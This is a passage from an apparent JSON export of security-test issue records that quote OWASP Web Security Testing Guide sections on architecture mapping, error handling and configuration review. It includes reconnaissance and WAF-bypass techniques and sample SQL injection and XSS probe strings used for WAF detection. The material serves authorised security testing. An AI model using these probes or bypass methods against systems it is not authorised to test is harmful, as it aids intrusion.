is made up of multiple discrete services, instead of being run as a monolithic application. The services themselves often run inside containers (usually with Kubernetes), and can use a variety of different operating systems and languages. Although they are typically behind a single API gateway and domain, the use of multiple languages (often indicated in detailed error messages) can suggest that microservices are in use.\n\n#### Static Storage\n\nMany applications store static content on dedicated storage platforms, rather than hosting it directly on the main web server. The two most common platforms are Amazon\u2019s S3 Buckets, and Azure\u2019s Storage Accounts, and can be easily identified by the domain names:\n\n* \u0060BUCKET.s3.amazonaws.com\u0060 or \u0060s3.REGION.amazonaws.com/BUCKET\u0060 for Amazon S3 Buckets\n* \u0060ACCOUNT.blob.core.windows.net\u0060 for Azure Storage Accounts\n\nThese storage accounts can often expose sensitive files, as discussed in the [Testing Cloud Storage Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage) section.\n\n#### Database\n\nMost non-trivial web applications use some kind of database to store dynamic content. In some cases, it\u2019s possible to determine the database. This can often be done by:\n\n* Port scanning the server and looking for any open ports associated with specific databases\n* Triggering SQL (or NoSQL) related error messages (or finding existing errors from a [search engine](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage)\n\nWhen it\u2019s not possible to conclusively determine the database, the tester can often make an educated guess based on other aspects of the application:\n\n* Windows, IIS and ASP.NET often use Microsoft SQL server\n* Embedded systems often use SQLite\n* PHP often uses MySQL or PostgreSQL\n* APEX often uses Oracle\n\nThese are not hard rules, but can certainly give you a reasonable starting point if no better information is available.\n\n#### Authentication\n\nMost applications have user authentication. There are multiple authentication backends that can be used, such as:\n\n* Web server configuration (including \u0060.htaccess\u0060 files) or hard-coding passwords in scripts\n    * Usually shows up as HTTP Basic authentication, indicated by a pop-up in the browser and a \u0060WWW-Authenticate: Basic\u0060 HTTP header\n* Local user accounts in a database\n    * Usually integrated into a form or API endpoint on the application\n* An existing central authentication source such as Active Directory or an LDAP server\n    * May use NTLM authentication, indicated by a \u0060WWW-Authenticate: NTLM\u0060 HTTP header\n    * May be integrated into the web application in a form\n    * May require the username to be entered in the \u201CDOMAIN\\username\u201D format, or may give a dropdown of available domains\n* Single Sign-On (SSO) with either an internal or external provider\n    * Typically uses OAuth, OpenID Connect, or SAML\n\nApplications may provide multiple options for the user to authenticate (such as registering a local account, or using their existing Facebook account), and may use different mechanisms for normal users and administrators.\n\n#### Third Party Services and APIs\n\nAlmost all web applications include third party resources that are loaded or that the client interacts with. These can include:\n\n* [Active content](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content#mixed_active_content) (such as scripts, style sheets, fonts, and iframes)\n* [Passive content](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content#mixed_passivedisplay_content) (such as images and videos)\n* External APIs\n* Social media buttons\n* Advertising networks\n* Payment gateways\n\nThese resources are requested directly by the user\u2019s browser, making them easier to identify using the developer tools, or an intercepting proxy. While it is important to identify them (as they can impact the security of the application), remember that *they are usually out-of-scope for testing*, as they belong to third parties.\n\n### Network Components\n\n#### Reverse Proxy\n\nA reverse proxy sits in front of one or more backend servers and redirects requests to the appropriate destination. They can be used to implement various functionality, such as:\n\n* Acting as a [load balancer](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture#load-balancer) or [web application firewall](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture#web-application-firewall-waf)\n* Allowing multiple applications to be hosted on a single IP address or domain (in subfolders)\n* Implementing IP filtering or other restrictions\n* Caching content from the backend to improve performance\n\nIt is not always possible to detect a reverse proxy (especially if there is only a single application behind it), but you can sometimes identify it by:\n\n* A mismatch between the frontend server and the backend application (such as a \u0060Server: nginx\u0060 header with an ASP.NET application)\n    * This can sometimes lead to [request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling)\n* Duplicate headers (especially the \u0060Server\u0060 header)\n* Multiple applications hosted on the same IP address or domain (especially if they use different languages)\n\n#### Load Balancer\n\nA load balancer sits in front of multiple backend servers and allocates requests between them in order to provide greater redundancy and processing capacity for the application.\nLoad balancers can be difficult to detect, but can sometimes be identified by making multiple requests and examining the responses for differences, such as:\n\n* Inconsistent system times\n* Different internal IP addresses or hostnames in detailed error messages\n* Different addresses returned from [Server-Side Request Forgery (SSRF)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)\n\nThey may also be indicated by the presence of specific cookies (for example, F5 BIG-IP load balancers will create a cookie called \u0060BIGipServer\u0060.\n\n#### Content Delivery Network (CDN)\n\nA Content Delivery Network (CDN) is a geographically distributed set of caching proxy servers designed to improve site performance.\nIt is typically configured by pointing the publicly facing domain to the CDN\u2019s servers, and then configuring the CDN to connect to the correct backend servers (sometimes known as the \u201Corigin\u201D).\nThe easiest way to detect a CDN is to perform a WHOIS lookup for the IP addresses that the domain resolves to. If they belong to a CDN company (such as Akamai, Cloudflare or Fastly - see [Wikipedia](https://en.wikipedia.org/wiki/Content_delivery_network#Notable_content_delivery_service_providers) for a more complete list), it is then likely that a CDN is in use.\nWhen testing a site behind a CDN, you should bear in mind the following points:\n\n* The IP addresses and servers belong to the CDN provider, and are likely to be out-of-scope for infrastructure testing\n* Many CDNs also include features such as bot detection, rate limiting, and web application firewalls\n* CDNs usually cache content. Therefore, changes made in the backend may not appear immediately on the site.\n\nIf the site is behind a CDN, it could be useful to identify the backend servers. If proper access control is not enforced, the tester may be able to bypass the CDN (and any protections it offers) by directly accessing the backend servers. There are a variety of different methods that may allow one to identify the backend system:\n\n* Emails sent by the application may come direct from the backend server, which could reveal it\u2019s IP address\n* DNS grinding, zone transfers or certificate transparency lists for a domain may reveal it on a subdomain\n* Scanning the IP ranges known to be used by the company may help identify the backend server\n* Exploiting [Server-Side Request Forgery (SSRF)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery) may reveal the IP address\n* Detailed error messages from the application may expose IP addresses or hostnames\n\n### Security Components\n\n#### Network Firewall\n\nMost web servers will be protected by a packet filtering or stateful inspection firewall, which blocks any network traffic that is not required. To detect this, perform a port scan of the server and examine the results.\nIf the majority of the ports are shown as \u201Cclosed\u201D (i.e, they return a \u0060RST\u0060 packet in response to the initial \u0060SYN\u0060 packet), this suggests that the server may not be protected by a firewall. If the ports are shown as \u201Cfiltered\u201D (i.e, no response is received when sending a \u0060SYN\u0060 packet to an unused port), then a firewall is most likely to be in place.\nAdditionally, if inappropriate services are exposed to the world (such as SMTP, IMAP, MySQL, etc), this suggests that either there is no firewall in place, or that the firewall is badly configured.\n\n#### Network Intrusion Detection and Prevention System\n\nA network Intrusion Detection System (IDS) is designed to detect suspicious or malicious network-level activity, such as port or vulnerability scanning, and raise alerts. An Intrusion Prevention System (IPS) functions similarly, but also takes action to prevent the activity, usually by blocking the source IP address.\nAn IPS can usually be detected by running automated scanning tools (such as a port scanner) against the target, and seeing if the source IP is blocked. However, many application-level tools may not be detected by an IPS (especially if it doesn\u2019t decrypt TLS).\n\n#### Web Application Firewall (WAF)\n\nA Web Application Firewall (WAF) inspects the contents of HTTP requests and blocks those that appear to be suspicious or malicious. They can also be used to dynamically apply other controls such as CAPTCHA or rate limiting. They usually utilize a set of known bad signatures and regular expressions, such as the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/), to identify malicious traffic. WAFs can be effective at protecting against certain types of attacks such as SQL injection or cross-site scripting, but are less effective against other types such as access control or business logic related issues.\nA WAF can be deployed in multiple locations, including:\n\n* On the web server itself\n* On a separate virtual machine or hardware appliance\n* In the cloud, in front of the backend server\n\nBecause a WAF blocks malicious requests, it can be detected by adding common attack strings to parameters and observing whether or not they are blocked. For example, try adding a parameter called \u0060foo\u0060 with a value such as \u0060\u0027 UNION SELECT 1\u0060 or \u0060\u003E\u003Cscript\u003Ealert(1)\u003C/script\u003E\u0060. If these requests are blocked, it is likely that there may be a WAF in place. Additionally, the contents of the block pages may provide information about the specific technology that is in use. Finally, some WAFs may add cookies or HTTP headers to responses that can reveal their presence.\nIf a cloud-based WAF is in use, then it may be possible to bypass it by directly accessing the backend server, using the same methods discussed in the [Content Delivery Network](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture#content-delivery-network-cdn) section.","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ERRH-01 Testing for Improper Error Handling","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"All types of applications (web apps, web servers, databases, etc.) will generate errors for various reasons. Developers often ignore handling these errors, or push away the idea that a user will ever try to trigger an error purposefully (*e.g.* sending a string where an integer is expected). When the developer only consider the happy path, they forget all other possible user-input the code can receive but can\u2019t handle.\nErrors sometimes rise as:\n\n* stack traces,\n* network timeouts,\n* input mismatch,\n* and memory dumps.\n\nImproper error handling can allow attackers to:\n\n* Understand the APIs being used internally.\n* Map the various services integrating with each other by gaining insight on internal systems and frameworks used, which opens up doors to attack chaining.\n* Gather the versions and types of applications being used.\n* DoS the system by forcing the system into a deadlock or an unhandled exception that sends a panic signal to the engine running it.\n* Controls bypass where a certain exception is not restricted by the logic set around the happy path.\n\n\n\u003Cbr\u003E\n","TestingInstructions":"## Test Objectives\n\n* Identify existing error output.\n* Analyze the different output returned.\n\n## How to Test\n\nErrors are usually seen as benign as they provide diagnostics data and messages that could help the user understand the problem at hand, or for the developer to debug that error.\nBy trying to send unexpected data, or forcing the system into certain edge cases and scenarios, the system or application will, most of the time, give out a bit on what\u2019s happening internally, unless the developers turned off all possible errors and return a certain custom message.\n\n### Web Servers\n\nAll web apps run on a web server, whether it was an integrated one or a fully fledged one. Web apps must handle and parse HTTP requests, and for that a web server is always part of the stack. Some of the most famous web servers are Nginx, Apache, and IIS.\nWeb servers have known error messages and formats. If one is not familiar with how they look, searching online for them would provide examples. Another way would be to look into their documentation, or simply setup a server locally and discover the errors by going through the pages that the web server uses.\nIn order to trigger error messages, a tester must:\n\n* Search for random files and folders that will not be found (404s).\n* Try to request folders that exist and see the server behavior (403s, blank page, or directory listing).\n* Try sending a request that breaks the [HTTP RFC](https://tools.ietf.org/html/rfc7231). One example would be to send a very large path, break the headers format, or change the HTTP version.\n    * Even if errors are handled on the application level, breaking the HTTP RFC may make the integrated web server show itself since it has to handle the request, and developers forget to override these errors.\n\n### Applications\n\nApplications are the most susceptible to let out a wide variety of error messages, which include: stack traces, memory dumps, mishandled exceptions, and generic errors. This happens due to the fact that applications are custom built most of the time and the developers need to observe and handle all possible error cases (or have a global error catching mechanism), and these errors can appear from integrations with other services.\nIn order to make an application throw these errors, a tester must:\n\n1. Identify possible input points where the application is expecting data.\n2. Analyse the expected input type (strings, integers, JSON, XML, etc.).\n3. Fuzz every input point based on the previous steps to have a more focused test scenario.\n    * Fuzzing every input with all possible injections is not the best solution unless you have unlimited testing time and the application can handle that much input.\n    * If fuzzing isn\u2019t an option, handpick viable inputs that have the highest chance to break a certain parser (*e.g.* a closing bracket for a JSON body, a large text where only a couple of characters are expected, CLRF injection with parameters that might be parsed by servers and input validation controls, special characters that aren\u2019t applicable for filenames, etc.).\n    * Fuzzing with jargon data should be ran for every type as sometimes the interpreters will break outside of the developer\u2019s exception handling.\n4. Understand the service responding with the error message and try to make a more refined fuzz list to bring out more information or error details from that service (it could be a database, a standalone service, etc.).\n\nError messages are sometimes the main weakness in mapping out systems, especially under a microservice architecture. If services are not properly set to handle errors in a generic and uniform manner, error messages would let a tester identify which service handles which requests, and allows for a more focused attack per service.\n\n\u003E The tester needs to keep a vigilant eye for the response type. Sometimes errors are returned as success with an error body, hide the error in a 302, or simply by having a custom way of representing that error.","Details":null,"Implication":null,"Recommendation":"For remediation, check out the [Proactive Controls C10](https://owasp.org/www-project-proactive-controls/v3/en/c10-errors-exceptions) and the [Error Handling Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html).","References":"* [WSTG: Appendix C - Fuzzing](https://owasp.org/www-project-web-security-testing-guide/latest/6-Appendix/C-Fuzzing)\n* [Proactive Controls C10: Handle All Errors and Exceptions](https://owasp.org/www-project-proactive-controls/v3/en/c10-errors-exceptions)\n* [ASVS v4.1 v7.4: Error handling](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md#v74-error-handling)\n* [CWE 728 - Improper Error Handling](https://cwe.mitre.org/data/definitions/728.html)\n* [Cheat Sheet Series: Error Handling](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)\n* [Juice Shop - Error Handling](https://pwning.owasp-juice.shop/companion-guide/latest/part2/security-misconfiguration.html#provoke-an-error-that-is-neither-very-gracefully-nor-consistently-handled)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"08-Testing for Error Handling","Description":"08-Testing for Error Handling","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"83f57a9c-e7c6-42c5-ba62-c816cd5369c0","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ERRH-02 Testing for Stack Traces","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/02-Testing_for_Stack_Traces","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/02-Testing_for_Stack_Traces","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"This content has been merged into: [Testing for Improper Error Handling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling).","TestingInstructions":null,"Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"This content has been merged into: [Testing for Improper Error Handling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling).","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"08-Testing for Error Handling","Description":"08-Testing for Error Handling","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"83f57a9c-e7c6-42c5-ba62-c816cd5369c0","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-01Test Network Infrastructure Configuration","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThe intrinsic complexity of interconnected and heterogeneous web server infrastructure, which can include hundreds of web applications, makes configuration management and review a fundamental step in testing and deploying every single application. It takes only a single vulnerability to undermine the security of the entire infrastructure, and even small and seemingly unimportant problems may evolve into severe risks for another application on the same server. In order to address these problems, it is of utmost importance to perform an in-depth review of configuration and known security issues, after having mapped the entire architecture.\nProper configuration management of the web server infrastructure is very important in order to preserve the security of the application itself. If elements such as the web server software, the backend database servers, or the authentication servers are not properly reviewed and secured, they might introduce undesired risks or introduce new vulnerabilities that might compromise the application itself.\nFor example, a web server vulnerability that would allow a remote attacker to disclose the source code of the application itself (a vulnerability that has arisen a number of times in both web servers and application servers) could compromise the application, as anonymous users could use the information disclosed in the source code to leverage attacks against the application or its users.\nThe following steps need to be taken to test the configuration management infrastructure:\n\n* The different elements that make up the infrastructure need to be determined in order to understand how they interact with a web application and how they affect its security.\n* All the elements of the infrastructure need to be reviewed in order to make sure that they don\u2019t contain any known vulnerabilities.\n* A review needs to be made of the administrative tools used to maintain all the different elements.\n* The authentication systems need to be reviewed in order to assure that they serve the needs of the application and that they cannot be manipulated by external users to leverage access.\n* A list of defined ports which are required for the application should be maintained and kept under change control.\n\nAfter having mapped the different elements that make up the infrastructure (see [Map Network and Application Architecture](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture)), it is possible to review the configuration of each element founded and test for any known vulnerabilities.","TestingInstructions":"## Test Objectives\n\n* Review the applications\u2019 configurations set across the network and validate that they are not vulnerable.\n* Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.\n\n## How to Test\n\n### Known Server Vulnerabilities\n\nVulnerabilities in various areas of the application architecture, whether in the web server or the backend database, can severely compromise the application. For example, consider a server vulnerability that allows a remote, unauthenticated user to upload files to the web server or even replace existing files. This vulnerability could compromise the application, since a rogue user may be able to replace the application itself or introduce code that would affect the backend servers, as its application code would be run just like any other application.\nReviewing server vulnerabilities can be hard to do if the test needs to be done through a blind penetration test. In these cases, vulnerabilities need to be tested from a remote site, typically using an automated tool. However, testing for some vulnerabilities can have unpredictable results on the web server, and testing for others (like those directly involved in denial of service attacks) might not be possible due to the service downtime involved if the test was successful.\nSome automated tools will flag vulnerabilities depending on the version of the web server they retrieve. This leads to both false positives and false negatives. On one hand, if the web server version has been removed or obscured by the local site administrator the scan tool will not flag the server as vulnerable even if it is. On the other hand, if the vendor providing the software does not update the web server version when vulnerabilities are fixed, the scan tool will flag vulnerabilities that do not exist. The latter case is actually very common as some operating system vendors back port patches of security vulnerabilities to the software they provide in the operating system, but do not do a full upload to the latest software version. This happens in most GNU/Linux distributions such as Debian, Red Hat, and SuSE. In most cases, vulnerability scanning of an application architecture will only find vulnerabilities associated with the \u201Cexposed\u201D elements of the architecture (such as the web server) and will usually be unable to find vulnerabilities associated to elements which are not directly exposed, such as the authentication backend, the backend database, or reverse proxies [1] in use.\nFinally, not all software vendors publicly disclose vulnerabilities, which means these weaknesses may not be registered within known vulnerability databases [2]. This information is only disclosed to customers or published through fixes that do not have accompanying advisories. This reduces the effectiveness of vulnerability scanning tools. Typically, vulnerability coverage of these tools will be very good for common products (such as the Apache web server, Microsoft IIS, or IBM\u2019s Lotus Domino) but will be lacking for lesser known products.\nThis is why reviewing vulnerabilities is best done when the tester is provided with internal information about the software, including versions, releases, and patches applied. With this information, the tester can retrieve data from the vendor and analyze potential vulnerabilities in the architecture, as well as their potential impact on the application. When possible, these vulnerabilities can be tested to determine their real effects and to detect if there might be any external elements (such as intrusion detection or prevention systems) that might reduce or negate the possibility of successful exploitation. Testers might even determine through a configuration review that the vulnerability is not actually present since it affects a software component that is not in use.\nIt is also worthwhile to note that vendors will sometimes silently fix vulnerabilities and make the fixes available with new software releases. Different vendors have varying release cycles that determine the support they may provide for older releases. A tester with detailed information about the software versions used by the architecture can analyse the risk associated with the use of old software releases that might be unsupported in the short term or are already unsupported. This is critical because if a vulnerability emerges in an unsupported older software version, the systems personnel may not be directly aware of it. No patches will be ever made available for it and advisories might not list that version as vulnerable as it is no longer supported. Even if they are aware of the vulnerability and the associated system risks, a full upgrade to a new software release will be necessary, potentially introducing significant downtime in the application architecture or necessitating application re-coding due to incompatibilities with the latest software version.\n\n### Administrative Tools\n\nAny web server infrastructure requires the existence of administrative tools to maintain and update the information used by the application. This information includes static content (web pages, graphic files), application source code, user authentication databases, etc. The type of administrative tools used can vary depending on the specific site, technology, or software in use. For example, some web servers will be managed using administrative interfaces which are themselves web servers (such as the iPlanet web server) or will be administrated by plain text configuration files (such as in the Apache case [3]) or use operating-system GUI tools (such as when using Microsoft\u2019s IIS server or ASP.Net).\nIn most cases, the server configuration is managed with various file maintenance tools, administered through FTP servers, WebDAV, network file systems (NFS, CIFS), or other mechanisms. Obviously, the operating system of the elements that make up the application architecture will also be managed using other tools. Applications may also contain embedded administrative interfaces for managing application data (users, content, etc.).\nAfter mapping the administrative interfaces used to manage different parts of the architecture, it is important to review them. If an attacker gains access to any of these interfaces, they could potentially compromise or damage the application architecture. To accomplish this, it\u2019s important to:\n\n* Determine the mechanisms that control access to these interfaces and their associated susceptibilities. This information may be available online.\n* Ensure that the default username and password are changed.\n\nSome companies choose not to manage all aspects of their web server applications and may delegate content management to other parties. This external company might provide only certain parts of the content (such as news updates or promotions), or it might completely manage the web server (including content and code). It is common to find administrative interfaces available from the internet in these situations, since using the internet is cheaper than providing a dedicated line that will connect the external company to the application infrastructure through a management-only interface. In such situations, it\u2019s crucial to test whether the administrative interfaces are vulnerable to attacks.\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [1] WebSEAL, also known as Tivoli Authentication Manager, is a reverse proxy from IBM which is part of the Tivoli framework.\n* [2] Such as Symantec\u2019s Bugtraq, ISS\u2019 X-Force, or NIST\u2019s National Vulnerability Database (NVD).\n* [3] There are some GUI-based administration tools for Apache (like NetLoony) but they are not in widespread use yet.","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-02 Test Application Platform Configuration","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nProper configuration of the single elements that make up an application architecture is important in order to prevent mistakes that might compromise the security of the whole architecture.\nReviewing and testing configurations are critical tasks in creating and maintaining an architecture. This is because various systems often come with generic configurations, which may not align well with the tasks they\u2019re supposed to perform on the specific sites where they\u2019re installed.\nWhile the typical web and application server installation will contain a lot of functionality (like application examples, documentation, test pages), what is not essential should be removed before deployment to avoid post-install exploitation.","TestingInstructions":"## Test Objectives\n\n* Ensure that default and known files have been removed.\n* Validate that no debugging code or extensions are left in the production environments.\n* Review the logging mechanisms set in place for the application.\n\n## How to Test\n\n### Black-Box Testing\n\n#### Sample and Known Files and Directories\n\nIn a default installation, many web servers and application servers provide sample applications and files for the benefit of the developer, in order to test if the server is working properly right after installation. However, many default web server applications have later been known to be vulnerable. This was the case, for example, for CVE-1999-0449 (Denial of Service in IIS when the Exair sample site had been installed), CAN-2002-1744 (Directory traversal vulnerability in CodeBrws.asp in Microsoft IIS 5.0), CAN-2002-1630 (Use of sendmail.jsp in Oracle 9iAS), or CAN-2003-1172 (Directory traversal in the view-source sample in Apache\u2019s Cocoon).\nCGI scanners, which include a detailed list of known files and directory samples provided by different web or application servers, might be a fast way to determine if these files are present. However, the only way to be really sure is to do a full review of the contents of the web server or application server, and determine whether they are related to the application itself or not.\n\n#### Comment Review\n\nIt is very common for programmers to add comments when developing large web-based applications. However, comments included inline in HTML code might reveal internal information that should not be available to an attacker. Sometimes, a part of the source code is commented out when a functionality is no longer required, but this comment is unintentionally leaked out to the HTML pages returned to the users.\nComment review should be done in order to determine if any information is being leaked through comments. This review can only be thoroughly done through an analysis of the web server\u2019s static and dynamic content, and through file searches. It can be useful to browse the site in an automatic or guided fashion, and store all the retrieved content. This retrieved content can then be searched in order to analyse any HTML comments available in the code.\n\n#### System Configuration\n\nVarious tools, documents, or checklists can be used to give IT and security professionals a detailed assessment of the target systems\u2019 conformance to various configuration baselines or benchmarks. Such tools include, but are not limited to, the following:\n\n* [CIS-CAT Lite](https://www.cisecurity.org/blog/introducing-cis-cat-lite/)\n* [Microsoft\u2019s Attack Surface Analyzer](https://github.com/microsoft/AttackSurfaceAnalyzer)\n* [NIST\u2019s National Checklist Program](https://nvd.nist.gov/ncp/repository)\n\n### Gray-Box Testing\n\n#### Configuration Review\n\nThe web server or application server configuration takes an important role in protecting the contents of the site and it must be carefully reviewed in order to spot common configuration mistakes. Obviously, the recommended configuration varies depending on the site policy, and the functionality that should be provided by the server software. In most cases, however, configuration guidelines (either provided by the software vendor or external parties) should be followed to determine if the server has been properly secured.\nIt is impossible to generically say how a server should be configured, however, some common guidelines should be taken into account:\n\n* Only enable server modules (ISAPI extensions in the case of IIS) that are needed for the application. This reduces the attack surface since the server is reduced in size and complexity as software modules are disabled. It also prevents vulnerabilities that might appear in the vendor software from affecting the site if they are only present in modules that have been already disabled.\n* Handle server errors (40x or 50x) with custom-made pages instead of with the default web server pages. Specifically make sure that any application errors will not be returned to the end user and that no code is leaked through these errors since it will help an attacker. It is actually very common to forget this point since developers do need this information in pre-production environments.\n* Make sure that the server software runs with minimized privileges in the operating system. This prevents an error in the server software from directly compromising the whole system, although an attacker could elevate privileges once running code as the web server.\n* Make sure the server software properly logs both legitimate access and errors.\n* Make sure that the server is configured to properly handle overloads and prevent Denial of Service attacks. Ensure that the server has been performance-tuned properly.\n* Never grant non-administrative identities (with the exception of \u0060NT SERVICE\\WMSvc\u0060) access to applicationHost.config, redirection.config, and administration.config (either Read or Write access). This includes \u0060Network Service\u0060, \u0060IIS_IUSRS\u0060, \u0060IUSR\u0060, or any custom identity used by IIS application pools. IIS worker processes are not meant to access any of these files directly.\n* Never share out applicationHost.config, redirection.config, and administration.config on the network. When using Shared Configuration, prefer to export applicationHost.config to another location (see the section titled \u201CSetting Permissions for Shared Configuration).\n* Keep in mind that all users can read .NET Framework \u0060machine.config\u0060 and root \u0060web.config\u0060 files by default. Do not store sensitive information in these files if it should be for administrator eyes only.\n* Encrypt sensitive information that should be read by the IIS worker processes only and not by other users on the machine.\n* Do not grant Write access to the identity that the Web server uses to access the shared \u0060applicationHost.config\u0060. This identity should have only Read access.\n* Use a separate identity to publish applicationHost.config to the share. Do not use this identity for configuring access to the shared configuration on the Web servers.\n* Use a strong password when exporting the encryption 